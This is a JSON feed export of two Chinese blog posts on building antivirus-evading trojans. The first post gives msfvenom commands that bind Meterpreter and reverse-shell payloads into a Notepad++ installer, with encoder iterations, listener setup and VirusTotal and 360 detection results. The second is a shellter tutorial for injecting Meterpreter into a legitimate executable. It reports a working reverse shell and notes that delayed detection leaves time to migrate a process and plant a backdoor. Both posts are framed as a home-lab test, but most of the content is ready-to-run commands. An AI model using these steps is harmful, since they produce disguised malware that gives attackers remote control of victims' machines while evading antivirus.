{
    "version": "https://jsonfeed.org/version/1",
    "title": "Prism Port • All posts by \"shellter\" tag",
    "description": "",
    "home_page_url": "https://www.sycamore.top",
    "items": [
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/",
            "title": "免杀木马测试",
            "date_published": "2022-04-18T12:48:36.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>测试杀软：360 全家桶</strong></p>\n</div>\n<h2 id=\"msf\"><a class=\"anchor\" href=\"#msf\">#</a> MSF</h2>\n<p><code>msfconsole</code></p>\n<ul>\n<li>\n<p><strong>mp_npp:</strong>（2022/4/16）</p>\n<ul>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &gt; mp_npp.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>不能完全通过 <strong>静态扫描</strong>，快速扫描没事，指定文件夹扫描木马会报毒，且运行时会<strong>第一时间</strong>检测出木马</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>40 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>mp_rc4_npp_i15：</strong>（2022/4/18）</p>\n<ul>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 15 -f exe &gt; mp_rc4_npp_i15.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp_rc4</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，但会被 <strong>动态检测</strong> 查杀</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>38 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvODQzOTE0OTNkODJhNTg3OGYyYTJlYWE5NDY1ZTk1YjRlYWUwOWJjODQ4NmQ1MTRjYzE5YTc0MWIxOTE4NzIxYg==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>sh_npp_i27：</strong>（2022/4/18）</p>\n<ul>\n<li><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 27 -f exe &gt; sh_npp_i27.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/shell_reverse_tcp_rc4</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，但会被 <strong>动态检测</strong> 查杀</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>35 /  69</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvMGE5NWQzOTBjODE2NWNmY2UxZGQ0Y2U0MDc2NGUyN2RiZmQ4OWJkMzk2YzZhMmE1OGFlNjYyZTYyM2FhNjIzMz9ub2NhY2hlPTE=\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"shellter-捆绑免杀\"><a class=\"anchor\" href=\"#shellter-捆绑免杀\">#</a> shellter 捆绑免杀</h2>\n<ul>\n<li><strong>shellter_npp：</strong>（2022/4/16）\n<ul>\n<li>payload 选择 <strong>shellter 自带</strong>的：Meterpreter_Reverse_TCP （选项 1）</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，<strong>动态检测</strong> 报毒会有 <strong>大约一分钟</strong> 的延迟（时间上足够<strong>迁移进程</strong> +<strong> 布置后门</strong>）</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>31 /  70</strong>）<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "shellter"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/",
            "title": "免杀捆绑工具 shellter 的安装及使用",
            "date_published": "2022-04-16T10:10:24.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>shellter</strong> 是一个<strong>捆绑</strong>工具，采用动态 <strong>shellcode</strong> 注入 的方式，将 <strong>shellcode</strong> 注入到其它程序中，达到<strong>免杀</strong>的效果，躲避杀软的查杀。</p>\n</div>\n<h2 id=\"shellter-安装\"><a class=\"anchor\" href=\"#shellter-安装\">#</a> shellter 安装</h2>\n<ol>\n<li>添加 <strong>i386 32 位</strong> 架构支持、更新 <strong>apt</strong>、安装 <strong>wine</strong> 依赖：\n<ul>\n<li><code>dpkg --add-architecture i386 &amp;&amp; apt update &amp;&amp; apt -y install wine32</code></li>\n</ul>\n</li>\n<li>安装 <strong>shellter</strong>：\n<ul>\n<li><code>apt install shellter</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443125/Typera/2023/04/0c4297a033272d1212d9cb86e4daf005.png\" alt=\"image-20230426011840045\" /></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"shellter-使用\"><a class=\"anchor\" href=\"#shellter-使用\">#</a> shellter 使用</h2>\n<blockquote>\n<p>使用 shellter 捆绑 Meterpreter_Reverse_TCP</p>\n</blockquote>\n<p><strong>捆绑步骤：</strong></p>\n<ol>\n<li>命令行输入  <code>shellter</code>  打开工具</li>\n<li>输入  <code>A</code>  或者  <code>a</code> ，选择 <strong>自动模式</strong>；</li>\n<li><code>PE Target:</code>  后输入要进行 <strong>捆绑</strong> 的 <strong>文件路径</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443164/Typera/2023/04/272fa29e9da9d004a3cf25b87079f7de.png\" alt=\"image-20230426011919683\" /><br />\n&lt;br&gt;</li>\n<li>输入 <code>Y</code> ，进入 <strong>隐形模式</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443168/Typera/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png\" alt=\"image-20230426011923428\" /><br />\n&lt;br&gt;</li>\n<li>输入 <code>L</code> ，使用 <strong>payload</strong> 攻击模块列表（即上面的 <strong>1~7</strong> ）</li>\n<li><strong>payload</strong> 编号选择  <code>1</code>  ，使用 Meterpreter_Reverse_TCP 攻击<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443172/Typera/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png\" alt=\"image-20230426011927372\" /><br />\n&lt;br&gt;</li>\n<li>分别输入监听端的 <strong>IP</strong>、<strong>端口号</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443175/Typera/2023/04/396417290b20f351cc3c1d96669a3c4e.png\" alt=\"image-20230426011931101\" /><br />\n&lt;br&gt;</li>\n<li>按  <code>[Enter]</code>  退出 <strong>shellter</strong> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443179/Typera/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png\" alt=\"image-20230426011934700\" /></li>\n</ol>\n<p>&lt;br&gt;</p>\n<p><strong>[关于生成的文件]</strong></p>\n<blockquote>\n<p><strong>捆绑完毕</strong>的文件 会代替 <strong>原文件</strong> ，即出现在 原文件目录 下，<strong>名字相同</strong><br />\n而<strong>原文件</strong>会 <strong>备份</strong> 在目录  <code>/root/Shellter_Backups/</code>  ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443183/Typera/2023/04/9b58fed5ce217d4b84967579f2522d55.png\" alt=\"image-20230426011938517\" /></p>\n</blockquote>\n<h2 id=\"利用-免杀效果\"><a class=\"anchor\" href=\"#利用-免杀效果\">#</a> 利用 &amp; 免杀效果</h2>\n<h3 id=\"利用\"><a class=\"anchor\" href=\"#利用\">#</a> 利用</h3>\n<ol>\n<li>上传到 <strong>Win7_x64</strong> 虚拟机，</li>\n<li><strong>Kali_Linux</strong> 虚拟机打开 <strong>msf</strong> （命令  <code>msfconsole</code> ），监听<strong>反弹 shell</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>反弹 shell</strong> 成功！<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443189/Typera/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png\" alt=\"image-20230426011944783\" /></p>\n<h3 id=\"免杀效果\"><a class=\"anchor\" href=\"#免杀效果\">#</a> 免杀效果</h3>\n<p>我的 <strong>Win7_x64 虚拟机</strong> 安装了 <strong>360 全家桶</strong>，</p>\n<p>但是 <strong>静态检测</strong> 貌似并没有查出 <strong>木马文件</strong>～</p>\n<p>运行木马程序，并成功获得 <strong>meterpreter</strong> 的 <strong>shell</strong> 之后，<strong>360</strong> 竟然也没有第一时间报毒。。。 什么情况 (⊙_⊙)？</p>\n<p>大概一分钟之后，才提示有木马：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443194/Typera/2023/04/69719cbb27c9df97660f0c6405be89c7.png\" alt=\"image-20230426011949574\" /><br />\n（实际上这个时间足够黑客 <strong>迁移进程</strong> 并 <strong>布置后门</strong> 了)</p>\n<p>当然，如果你的电脑以前中过这个毒，<strong>360</strong> 会第一时间反应过来<br />\n（但这要是<strong>还没反应</strong>，<strong>360</strong> 就该进回收站了）</p>\n<p>然后看看 <strong>virustotal</strong> 的检测情况（<strong>31 / 70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==\">检测报告 传送门 1</span><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443198/Typera/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png\" alt=\"image-20230426011954090\" /></p>\n<p><em><strong>对比 ：</strong></em><br />\n使用 同程序 同<strong> payload</strong>，用 <strong>msf</strong> 自带的捆绑手段生成的木马：<br />\n（命令： <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &gt; mp_npp.exe</code> ）</p>\n<p><strong>virustotal</strong> 的检测情况（<strong>40 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==\">检测报告 传送门 2</span><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443202/Typera/2023/04/c0631de31f6d8f365c052ec14a014b37.png\" alt=\"image-20230426011958597\" /></p>\n<blockquote>\n<p>相比较而言，可以说 <strong>shellter</strong> 的捆绑<strong>免杀</strong>效果比 <strong>msf</strong> 好很多了。</p>\n</blockquote>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "shellter"
            ]
        }
    ]
}